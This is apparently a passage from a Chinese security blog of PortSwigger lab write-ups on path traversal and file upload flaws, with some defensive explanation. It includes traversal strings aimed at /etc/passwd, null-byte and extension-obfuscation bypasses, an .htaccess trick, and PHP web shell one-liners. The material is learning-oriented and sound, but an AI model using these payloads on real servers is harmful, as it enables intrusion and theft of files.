        <p>当然有可能。这取决于服务器的配置和代码实现。如果服务器只进行一次解码，那么攻击者需要直接使用单次编码的字符，例如<code>%2e%2f%2e%2e</code>等。而如果服务器解码次数超过两次，比如三次，那么攻击者可能需要使用三重编码，比如<code>%2525252e</code>（假设三重编码的话）。不过这种情况比较少见，因为通常服务器不会多次解码。</p>

    </div>
</div>
<h3 id="Lab-File-path-traversal-validation-of-start-of-path">Lab: File path traversal, validation of start of path</h3>
<p>应用程序可能要求用户提供的文件名以预期的基本文件夹开始，如 <code>/var/www/images</code>。在这种情况下，可以在所需的基本文件夹后加上适当的遍历序列。例如：<code>filename=/var/www/images/.../.../.../etc/passwd</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>我用了url编码，不使用url编码也是可以的，这里单层解码，双层就不行了</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430171637924.png" alt="image-20250430171637924"></p>
<h3 id="Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab: File path traversal, validation of file extension with null byte bypass</h3>
<p>应用程序可能要求用户提供的文件名以预期的文件扩展名结尾，如 .png。在这种情况下，可以使用空字节在所需扩展名之前有效地终止文件路径。例如：filename=…/…/…/etc/passwd%00.png。</p>
<p>本实验室在显示产品图像时存在路径遍历漏洞。应用程序会验证所提供的文件名是否以预期的文件扩展名结尾。要解决该实验问题，请检索 /etc/passwd 文件的内容。</p>
<p>这个感觉好牛啊，希望自己慢慢积累，积跬步至千里吧。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>相对路径后加<code>%00.png</code>绕过文件后缀验证</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430172259167.png" alt="image-20250430172259167"></p>
<h2 id="如何防止路径遍历攻击">如何防止路径遍历攻击</h2>
<p>防止路径遍历漏洞的最有效方法是完全避免将用户提供的输入传递给文件系统 API。许多这样做的应用程序函数都可以重写，以更安全的方式提供相同的行为。</p>
<p>如果无法避免将用户提供的输入传递给文件系统 API，我们建议使用两层防御来防止攻击：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在处理用户输入之前对其进行验证。理想情况下，将用户输入与允许值白名单进行比较。如果做不到这一点，则要验证输入是否只包含允许的内容，例如只包含字母数字字符。</p>
</li>
<li class="lvl-2">
<p>验证所提供的输入后，将输入追加到基本目录，并使用平台文件系统 API 对路径进行规范化。验证规范化路径是否以预期的基本目录开始。</p>
</li>
</ul>
<p>下面是一个根据用户输入验证文件规范路径的简单 Java 代码示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码逐行解析：</strong></p>
<ol>
<li class="lvl-3">
<p>创建文件对象</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>File</code>类</strong>：Java中用于表示文件或目录路径的类。</p>
</li>
<li class="lvl-2">
<p><strong>构造函数参数</strong>：</p>
<ul class="lvl-2">
<li class="lvl-4"><code>BASE_DIRECTORY</code>：预定义的基础目录（如<code>/safe/path</code>），用于限制文件访问范围。</li>
<li class="lvl-4"><code>userInput</code>：用户输入的路径（如<code>data.txt</code>或<code>../../secret.txt</code>）。</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>作用</strong>：将两者拼接成完整路径。例如：</p>
<ul class="lvl-2">
<li class="lvl-4">若<code>BASE_DIRECTORY</code>是<code>/safe</code>，<code>userInput</code>是<code>file.txt</code>，则拼接为<code>/safe/file.txt</code>。</li>
<li class="lvl-4">若<code>userInput</code>是<code>../etc/passwd</code>，则拼接为<code>/safe/../etc/passwd</code>。</li>
</ul>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>路径规范化验证</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// 处理文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>getCanonicalPath()</code></strong>：将路径转换为<strong>绝对且唯一</strong>的规范形式：</p>
<ul class="lvl-2">
<li class="lvl-4">解析<code>.</code>（当前目录）和<code>..</code>（上级目录）。</li>
<li class="lvl-4">去除多余的斜杠（如<code>/safe//file</code>变为<code>/safe/file</code>）。</li>
<li class="lvl-4">解析符号链接（如将快捷方式转为真实路径）。</li>
</ul>
<p>例如：<code>/safe/../etc/passwd</code> 会被规范化为 <code>/etc/passwd</code>。</p>
</li>
<li class="lvl-2">
<p><strong><code>startsWith(BASE_DIRECTORY)</code></strong>：检查规范路径是否以<code>BASE_DIRECTORY</code>开头。</p>
<ul class="lvl-2">
<li class="lvl-4">若用户输入合法（如<code>data.txt</code>），规范路径为<code>/safe/data.txt</code>，验证通过。</li>
<li class="lvl-4">若用户输入非法（如<code>../../etc/passwd</code>），规范路径为<code>/etc/passwd</code>，验证失败。</li>
</ul>
</li>
</ul>
<p>但是这段代码应该有一定的问题，就是只要保证文件路径与<code>BASE_DIRECTORY</code>一致即可。比如说，如果<code>BASE_DIRECTORY</code>是<code>/base</code>便可以构造<code>/baseXXXX</code>越权访问与文件开头与<code>BASE_DIRECTORY</code>一致的同级目录。</p>
<p>本文参考：</p>
<p><a href="https://portswigger.net/web-security/file-path-traversal">Path traversal</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>靶场练习</category>
        <category>PortSwigger靶场</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>路径遍历</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】文件上传</title>
    <url>/posts/34bab347/</url>
    <content><![CDATA[<h2 id="原理与危害">原理与危害</h2>
<p>文件上传漏洞是指网络服务器允许用户上传文件到其文件系统，而未对文件名、类型、内容或大小等进行充分验证。这就可能导致允许攻击者上传有潜在危险的文件，甚至可能包括支持远程代码执行的服务器端脚本文件。</p>
<p>在某些情况下，上传文件本身就足以造成破坏。其他攻击可能涉及对文件的后续 HTTP 请求，通常是为了触发服务器执行文件。</p>
<span id="more"></span>
<h2 id="文件上传漏洞的影响">文件上传漏洞的影响</h2>
<p>文件上传漏洞的影响通常取决于两个关键因素：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>网站未能正确验证文件的哪个方面，无论是文件大小、类型还是内容等。</p>
</li>
<li class="lvl-2">
<p>文件上传成功后，对文件施加了哪些限制。</p>
</li>
</ul>
<p>在最坏的情况下，文件类型没有得到正确验证，服务器配置允许某些类型的文件（如 .php 和 .jsp）作为代码执行。在这种情况下，攻击者有可能上传一个服务器端代码文件，该文件可作为 web shell 使用，就可以完全控制服务器。</p>
<p>如果文件名没有得到正确验证，攻击者只需上传同名文件，就能覆盖关键文件。如果服务器还存在目录遍历漏洞，这就意味着攻击者甚至可以将文件上传到意想不到的位置，比如覆盖服务器的系统文件。</p>
<p>如果不能确保文件大小在预期的阈值范围内，还可能导致某种形式的拒绝服务（DoS）攻击，即攻击者填满可用磁盘空间。</p>
<h2 id="文件上传漏洞是如何产生的">文件上传漏洞是如何产生的</h2>
<p>因为文件上传漏洞巨大的危害性，网站很少会对允许用户上传的文件不加任何限制。更常见的情况是，开发人员实施他们认为强大的验证，但这种验证要么存在固有缺陷，要么很容易被绕过。</p>
<p>例如，它们可能试图将危险文件类型列入黑名单，但在检查文件扩展名时却没有考虑到解析差异。与任何黑名单一样，黑名单也很容易不小心遗漏更隐蔽的文件类型，而这些文件类型可能仍然具有危险性。</p>
<p>在其他情况下，网站可能会尝试通过验证属性来检查文件类型，而这些属性很容易被使用 Burp Proxy 或 Repeater 等工具的攻击者操纵。</p>
<p>最后，即使是强大的验证措施，在构成网站的主机和目录网络中的应用也可能不一致，从而导致可被利用的差异。</p>
<h2 id="网络服务器如何处理静态文件请求">网络服务器如何处理静态文件请求</h2>
<p>在了解如何利用文件上传漏洞之前，您必须对服务器如何处理静态文件请求有一个基本的了解。</p>
<p>过去，网站几乎完全由静态文件组成，当用户提出请求时，网站就会向用户提供静态文件。因此，每个请求的路径都可以与服务器文件系统中的目录和文件层次结构进行 1:1  的映射。如今，网站越来越动态化，请求的路径往往与文件系统没有任何直接关系。不过，网络服务器仍然要处理一些静态文件的请求，包括样式表、图像等。</p>
<p>处理这些静态文件的流程大致相同。服务器会解析请求中的路径，以确定文件扩展名。然后，服务器根据扩展名和 MIME 类型之间的预配置映射列表来确定请求的文件类型。接下来会发生什么取决于文件类型和服务器配置。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果该文件类型不可执行，如图像或静态 HTML 页面，服务器可能只会在 HTTP 响应中向客户端发送文件内容。</p>
</li>
<li class="lvl-2">
<p>如果文件类型是可执行的，如 PHP 文件，且服务器被配置为执行此类文件，那么在运行脚本之前，服务器会根据 HTTP 请求中的头和参数来分配变量。由此产生的输出结果会在 HTTP 响应中发送给客户端。</p>
</li>
<li class="lvl-2">
<p>如果文件类型是可执行的，但服务器未配置为执行该类型的文件，则通常会响应错误。不过，在某些情况下，文件内容仍会以纯文本形式提供给客户端。这种错误配置偶尔会被利用来泄露源代码和其他敏感信息。</p>
</li>
</ul>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        TIPS
    </div>
    <div class="spoiler-content">
        <p><code>Content-Type</code> 响应头可提供服务器认为它已提供的文件类型的线索。如果应用程序代码没有明确设置该标头，它通常包含文件扩展名/MIME 类型映射的结果。</p>

    </div>
</div>
<h2 id="利用不受限制的文件上传部署网络外壳">利用不受限制的文件上传部署网络外壳</h2>
<p>从安全角度来看，最糟糕的情况是网站允许您上传服务器端脚本（如 PHP、Java 或 Python 文件），并将其配置为代码执行。这样，在服务器上创建自己的网络外壳就变得轻而易举了。</p>
<blockquote>
<p>Web shell</p>
<p>Web shell是一种恶意脚本，攻击者只需向正确的端点发送 HTTP 请求，就能在远程网络服务器上执行任意命令</p>
</blockquote>
<p>如果你能成功上传Web shell，你实际上就拥有了对服务器的完全控制权。这意味着你可以读写任意文件、外泄敏感数据，甚至利用服务器对内部基础架构和网络外的其他服务器进行透视攻击。例如，可以使用下面的 PHP 单行程序从服务器的文件系统中读取任意文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/target/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一旦上传，发送对该恶意文件的请求就会在响应中返回目标文件的内容。</p>
<h4 id="Lab-通过Web-shell-上传远程执行代码">Lab: 通过Web shell 上传远程执行代码</h4>
<p>本实验室包含一个易受攻击的图片上传功能。在将用户上传的文件存储到服务器文件系统之前，它没有对这些文件执行任何验证。</p>
<p>要解决该实验问题，请上传一个基本的<code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
<p>要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
<p>您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
<ol>
<li class="lvl-3">
<p>登录题目给的账户后，可以上传头像</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430120836773.png" alt="image-20250430120836773"></p>
<ol start="2">
<li class="lvl-3">
<p>上传1.php文件</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/home/carlos/secret&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/34bab347//image-20250430120903346.png" alt="image-20250430120903346"></p>
<ol start="3">
<li class="lvl-3">
<p>打开图像</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430121009450.png" alt="image-20250430121009450"></p>
<p>总结：前端无防护、后端无防护、服务器具备执行条件。</p>
<h2 id="利用文件上传验证的缺陷">利用文件上传验证的缺陷</h2>
<p>在网络中，你不太可能发现一个网站像我们在上一个实验室中看到的那样，对文件上传攻击没有任何防护措施。但是，有了防御措施，并不意味着它们就是强大的。有时，你仍然可以利用这些机制中的漏洞来获取网络外壳，从而远程执行代码。</p>
<h3 id="文件类型验证存在缺陷">文件类型验证存在缺陷</h3>
<p>在提交 HTML 表单时，浏览器通常会在 <code>POST </code>请求中发送所提供的数据，内容类型为  <code>application/x-www-form-url-encoded</code>。这对于发送简单的文本（如姓名或地址）很合适。但它不适合发送大量二进制数据，如整个图像文件或 PDF 文档。在这种情况下，首选内容类型为 <code>multipart/form-data</code>。</p>
<p>考虑一个包含上传图片、提供图片说明和输入用户名等字段的表单。提交这样的表单后，可能会得到类似下面的请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /images HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line">    Content-Length: <span class="number">12345</span></span><br><span class="line">    Content-<span class="type">Type</span>: multipart/form-data; boundary=---------------------------012345678901234567890123456</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;image&quot;</span>; filename=<span class="string">&quot;example.jpg&quot;</span></span><br><span class="line">    Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">    [...binary content of example.jpg...]</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;description&quot;</span></span><br><span class="line"></span><br><span class="line">    This <span class="keyword">is</span> an interesting description of my image.</span><br><span class="line"></span><br><span class="line">    ---------------------------012345678901234567890123456</span><br><span class="line">    Content-Disposition: form-data; name=<span class="string">&quot;username&quot;</span></span><br><span class="line"></span><br><span class="line">    wiener</span><br><span class="line">    ---------------------------012345678901234567890123456--</span><br></pre></td></tr></table></figure>
<p>正如你所看到的，消息正文被分割成不同的部分，分别用于表单的每个输入。每个部分都包含一个 <code>Content-Disposition</code>  标头，它提供了与输入字段相关的一些基本信息。这些单独的部分还包含自己的 <code>Content-Type</code> 标头，告诉服务器使用此输入提交的数据的  MIME 类型。</p>
<p>网站尝试验证文件上传的一种方法是检查特定于输入的 Content-Type 标头是否与预期的 MIME  类型相匹配。例如，如果服务器只接收图像文件，它可能只允许图像/jpeg 和图像/png  等类型。当服务器默认信任该标头的值时，就会出现问题。如果不执行进一步的验证来检查文件内容是否真的与假定的 MIME 类型相匹配，就可以使用  Burp Repeater 等工具轻松绕过这一防御。</p>
<h4 id="Lab-绕过内容类型限制上传网络外壳">Lab: 绕过内容类型限制上传网络外壳</h4>
<p>本实验室包含一个易受攻击的图片上传功能。它试图防止用户上传意外的文件类型，但需要依靠检查用户可控输入来验证。</p>
<p>要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。</p>
<p>您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
<ol>
<li class="lvl-3">
<p>上传PHP代码发现进行了前端防护</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123852944.png" alt="image-20250430123852944"></p>
<ol start="2">
<li class="lvl-3">
<p>将Content-Type修改为符合规定的内容，php代码不变，即可上传成功</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123908753.png" alt="image-20250430123908753"></p>
<ol start="3">
<li class="lvl-3">
<p>访问账户的头像通关</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123725160.png" alt="image-20250430123725160"></p>
<p>总结：前端防护，限制上传的文件类型，通过Burp Suitte 修改文件名绕过检测。后端无防护，服务器具备执行条件。</p>
<h3 id="防止在用户可访问的目录中执行文件">防止在用户可访问的目录中执行文件</h3>
<p>虽然从一开始就防止上传危险文件类型显然更好，但第二道防线阻止服务器执行任何漏网脚本。</p>
<p>为谨慎起见，服务器通常只运行其 MIME 类型已明确配置为可执行的脚本。否则，它们可能只会返回某种错误信息，或者在某些情况下，以纯文本形式提供文件内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /static/exploit.php?command=<span class="built_in">id</span> HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">    Content-<span class="type">Type</span>: text/plain</span><br><span class="line">    Content-Length: <span class="number">39</span></span><br><span class="line"></span><br><span class="line">    &lt;?php echo system($_GET[<span class="string">&#x27;command&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
<p>这种行为本身可能很有趣，因为它提供了一种泄漏源代码的方法，但它使任何创建网络 shell 的尝试都化为乌有。</p>
<p>这种配置通常因目录而异。上传用户提供文件的目录可能比文件系统中其他位置的控制要严格得多，因为其他位置被认为是最终用户无法访问的。如果你能找到一种方法，将脚本上传到另一个不应该包含用户提供文件的目录，那么服务器终究可能会执行你的脚本。</p>
<p><font class="notice">注意：网络服务器通常使用<code>multipart/form-data</code>请求中的文件名字段来确定文件的名称和保存位置。</font></p>
<h4 id="Lab：通过路径遍历上传网络-shell">Lab：通过路径遍历上传网络 shell</h4>
<p>该实验室包含一个易受攻击的图片上传功能。服务器被配置为防止执行用户提供的文件，但可通过利用次要漏洞（文件路径遍历）绕过此限制。要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>按照以往的方式访问自己上传的php代码，服务器直接将php代码以文本方式返回</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183245601.png" alt="image-20250430183245601"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>修改<code>filename</code>目录遍历语句被服务器清理</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183451599.png" alt="image-20250430183451599"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用url编码上传成功</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183708967.png" alt="image-20250430183708967"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>访问即可</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183739696.png" alt="image-20250430183739696"></p>
<p>您还应注意，尽管您可能会将所有请求发送到同一域名，但这通常指向某种反向代理服务器，如负载平衡器。您的请求通常会由其他服务器在幕后处理，这些服务器的配置也可能不同。</p>
<h3 id="危险文件类型黑名单不足">危险文件类型黑名单不足</h3>
<p>防止用户上传恶意脚本的一个比较明显的方法是将 <code>.php</code>  等潜在危险的文件扩展名列入黑名单。黑名单的做法本质上是有缺陷的，因为很难明确阻止每一个可能用于执行代码的文件扩展名。有时可以通过使用较不知名的、仍可执行的替代文件扩展名（如 <code>.php5</code>、<code>.shtml</code> 等）来绕过此类黑名单。针对这种防护，可以尝试以下几种方式进行绕过：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用不常见的后缀名：<code>php5,pht,phpt,phtml,php3,php4,php5,php6</code></p>
</li>
<li class="lvl-2">
<p>使用大小写：<code>.pHp</code></p>
</li>
<li class="lvl-2">
<p>重写服务器配置文件：apache的<code>.htaccess</code>或者IIS的<code>web.config</code></p>
</li>
<li class="lvl-2">
<p>使用多扩展名，譬如<code>example.php.jpg</code>，这种方式依赖于服务器如何解析文件，如果服务器<strong>从前往后解析，并且解析到第一个扩展名就停止解析</strong>，则该文件会被当作<code>example.php</code>存储</p>
</li>
<li class="lvl-2">
<p>添加尾随字符，有些组件可能会过滤或忽视文件名末尾的空格或小数点，譬如<code>example.php.</code>或<code>example.php </code> (末尾有一个空格)</p>
</li>
<li class="lvl-2">
<p>尝试使用url编码，譬如：<code>example%2ephp</code></p>
</li>
<li class="lvl-2">
<p>再文件扩展名前添加分号或者url编码的空字符，譬如：<code>example.php;jpg</code>或<code>example.php%00.jpg</code></p>
</li>
<li class="lvl-2">
<p>使用多字节Unicode字符，譬如Unicode字符序列：<code>xC0 xAE</code>，<code>xC4 xAE</code>，<code>xC0 x2E</code>再utf-8编码下可能转化为<code>x2E</code>，然后转化为ASCII字符使用</p>
</li>
</ul>
<h4 id="覆盖服务器配置">覆盖服务器配置</h4>
<p>正如我们在上一节所讨论的，除非经过配置，否则服务器通常不会执行文件。例如，若允许 Apache 服务器执行客户端请求的 PHP 文件，开发人员需要在 <code>/etc/apache2/apache2.conf</code> 文件中添加以下指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LoadModule php_module /usr/lib/apache2/modules/libphp.so</span><br><span class="line">    AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
<p>许多服务器还允许开发人员在个别目录中创建特殊配置文件，以覆盖或添加一个或多个全局设置。例如，Apache 服务器会从名为 <code>.htaccess</code> 的文件中加载特定目录的配置（如果有的话）。</p>
<p>同样，开发人员可以使用 <code>web.config</code> 文件对 IIS 服务器进行特定目录配置。这可能包括以下指令，在本例中，这些指令允许向用户提供 JSON 文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">staticContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mimeMap</span> <span class="attr">fileExtension</span>=<span class="string">&quot;.json&quot;</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/json&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">staticContent</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>网络服务器会使用这类配置文件，但通常不允许使用 HTTP 请求访问它们。不过，你偶尔会发现服务器无法阻止你上传自己的恶意配置文件。在这种情况下，即使你需要的文件扩展名被列入了黑名单，你也可以欺骗服务器将任意的自定义文件扩展名映射到可执行的 MIME 类型。</p>
<h5 id="Lab：通过扩展黑名单绕过网络外壳上传">Lab：通过扩展黑名单绕过网络外壳上传</h5>
<p>本实验室包含一个易受攻击的图片上传功能。某些文件扩展名被列入了黑名单，但由于该黑名单配置中的一个基本缺陷，这一防御可被绕过。要解决该实验问题，请上传一个基本的 PHP web shell，然后使用它渗出文件 /home/carlos/secret 的内容。使用实验横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter。</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        Hint
    </div>
    <div class="spoiler-content">
        <p>You need to upload two different files to solve this lab.</p>

    </div>
</div>
<ul class="lvl-0">
<li class="lvl-2">
<p>直接上传php文件失败，服务采用了黑名单防护机制</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505174128331.png" alt="image-20250505174128331"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>尝试上传Apache的配置文件<code>htaccess</code>，将文件扩展名 <strong><code>.l33t</code></strong> 关联到PHP解析器，，提醒上传成功</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505174603001.png" alt="image-20250505174603001"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>再试上传恶意文件成功</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505175302956.png" alt="image-20250505175302956"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>访问即可获得密码</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505175433671.png" alt="image-20250505175433671"></p>
<p><strong>代码解释：</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .l33t</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>AddType</code></strong>：Apache指令，用于将特定文件扩展名映射到对应的MIME类型。</p>
</li>
<li class="lvl-2">
<p><strong><code>application/x-httpd-php</code></strong>：PHP脚本的MIME类型，告诉服务器使用PHP解析器处理该文件。</p>
</li>
<li class="lvl-2">
<p><strong><code>.l33t</code></strong>：自定义的文件扩展名（通常用于替代常见的 <code>.php</code>）。</p>
</li>
</ul>
<p><strong>作用：</strong></p>
<ol>
<li class="lvl-3">
<p><strong>PHP解析</strong>：所有以 <code>.l33t</code> 结尾的文件会被Apache视为PHP脚本，<strong>其中的PHP代码会被服务器解析执行</strong>。</p>
</li>
<li class="lvl-3">
<p><strong>隐藏技术栈</strong>：通过非标准扩展名（如 <code>.l33t</code>）隐藏网站使用的PHP技术，增加攻击者识别难度（但实际安全提升有限，需配合其他措施）。</p>
</li>
</ol>
<h4 id="混淆文件扩展名">混淆文件扩展名</h4>
<p>即使是最详尽的黑名单，也有可能被经典的混淆技术绕过。假设验证代码对大小写敏感，无法识别 exploit.pHp 实际上是 .php  文件。如果随后将文件扩展名映射到 MIME 类型的代码对大小写不敏感，这种差异就会使恶意 PHP 文件偷偷通过验证，最终被服务器执行。</p>
<p>您还可以使用以下技术实现类似的效果：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>提供多种扩展名。根据解析文件名所使用的算法，以下文件可能被解释为 PHP 文件或 JPG 图像：exploit.php.jpg</p>
</li>
<li class="lvl-2">
<p>添加尾部字符。某些组件会删除或忽略尾部空格、点等类似字符： exploit.php.jpg。</p>
</li>
<li class="lvl-2">
<p>尝试使用 URL 编码（或双 URL 编码）来处理点、正斜线和反斜线。如果在验证文件扩展名时未对该值进行解码，但随后在服务器端进行了解码，这样也可以上传恶意文件，否则会被阻止： exploit%2Ephp在文件扩展名前添加分号或 URL 编码的空字节字符。</p>
</li>
<li class="lvl-2">
<p>如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C/C++  等低级函数处理文件，这可能会导致文件名末尾的处理不一致：exploit.asp;.jpg 或 exploit.asp%00.jpg尝试使用多字节 unicode 字符，这些字符可能在 unicode 转换或规范化后被转换为空字节和点。</p>
</li>
<li class="lvl-2">
<p>如果文件名被解析为 UTF-8 字符串，xC0  x2E、xC4 xAE 或 xC0 xAE 等序列可能会被转换为 x2E，但在路径中使用前又会被转换为 ASCII 字符。</p>
</li>
</ul>
<p>其他防御措施包括删除或替换危险的扩展名，以防止文件被执行。如果这种转换不是递归应用的，你可以将禁止的字符串定位在这样一种方式，即删除它仍然会留下一个有效的文件扩展名。例如，如果从以下文件名中删除 .php 会发生什么情况：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">exploit<span class="selector-class">.p</span>.phphp</span><br></pre></td></tr></table></figure>
<p>这只是混淆文件扩展名的众多方法中的一小部分。</p>
<h5 id="Lab：通过混淆文件扩展名上传网络外壳">Lab：通过混淆文件扩展名上传网络外壳</h5>
<p>该实验室包含一个易受攻击的图片上传功能。某些文件扩展名被列入了黑名单，但可以使用经典的混淆技术绕过这一防御。要解决该实验问题，请上传一个基本的 PHP web shell，然后用它来外泄文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>直接上传失败，提示只能传JPG和PNG</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505184603898.png" alt="image-20250505184603898"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><s>啊，这就过啦</s>   添加后缀，文件的后缀并没有变，考虑添加空字节</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505184818551.png" alt="image-20250505184818551"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>这就可以了</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505214317371.png" alt="image-20250505214317371"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>访问就可以得到密码</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505214506196.png" alt="image-20250505214506196"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        补充
    </div>
    <div class="spoiler-content">
        <ul class="lvl-0">
<li class="lvl-2">
<p><code>%00</code> 是 <strong>URL编码的空字符（Null Character）</strong>，对应 ASCII 码中的 <code>0x00</code>。它在计算机系统中通常表示字符串的<strong>结束符</strong>，但在不同场景下可能引发安全问题或功能异常。</p>
</li>
<li class="lvl-2">
<p>旧版PHP（5.3之前）存在空字节阶段漏洞，PHP&gt;=5.3版本中已将其修复</p>
</li>
<li class="lvl-2">
<p>如 PHP 的 <code>basename()</code> 会自动过滤空字符。</p>
</li>
<li class="lvl-2">
<p>在路径遍历在也可以利用 <code>%00</code> 截断路径，访问非授权文件（如 <code>../../secret.log%00</code>）。</p>
</li>
<li class="lvl-2">
<p>大多数 Web 服务器并不是在一开始安装成功后就能执行文件的，像 Apache，要执行 PHP 脚本，需要在 <code>/etc/apache2/apache2.conf</code> 配置文件中添加如下指令加载 php 模块，以及当访问后缀名为 <code>.php</code> 的文件时，作为 php 脚本执行。：</p>
</li>
</ul>
<blockquote>
<p>LoadModule php_module /usr/lib/apache2/modules/libphp.so<br>
AddType application/x-httpd-php .php</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
